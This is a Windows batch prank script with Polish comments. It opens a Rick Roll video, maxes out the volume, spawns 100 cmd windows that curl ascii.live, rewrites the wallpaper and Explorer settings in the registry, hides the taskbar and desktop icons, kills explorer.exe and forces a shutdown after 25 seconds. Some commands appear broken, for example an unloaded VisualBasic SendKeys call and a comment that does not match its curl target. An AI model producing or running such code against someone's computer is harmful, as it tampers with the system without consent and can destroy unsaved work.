@echo off

:: Otwiera Rick Roll na YouTube
for /l %%x in (1, 1, 1) do (
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
timeout /t 5
)

:: Odtwarza dźwięk na 100% głośności na wszystkich urządzeniach
:: Ustawia głośność dźwięku na 100% przy użyciu nircmd
D:\nircmd\nircmd.exe setsysvolume 65535

:: Ustawia głośność dźwięku na wszystkich urządzeniach
powershell -Command "Get-AudioDevice | ForEach-Object {Set-AudioDeviceVolume -DeviceId $_.DeviceId -Volume 100}"



:: Otwiera 100 okienek cmd z komendą curl parrot.live w tle
for /l %%x in (1, 1, 100) do (
start cmd /c "curl ascii.live/can-you-hear-me" /b
)

:: Ustawia tapetę na Rick Roll
REG ADD "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "D:\files\others\wallpaper to rick roll.jpg" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Ukrywa pasek zadań
powershell -Command "$p = Get-Process explorer; $p.WaitForInputIdle(); [Microsoft.VisualBasic.Interaction.Shell]::SendKeys('%{ESC}')"

:: Ukrywa ikony na pulpicie
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 1 /f

:: Importuje plik rejestru, aby ukryć pasek zadań
REG IMPORT "D:\files\others\hide_taskbar.reg"

:: Restartuje eksplorator Windows
taskkill /f /im explorer.exe
start explorer.exe

:: Wyłącza komputer po 25 sekundach
shutdown -s -t 25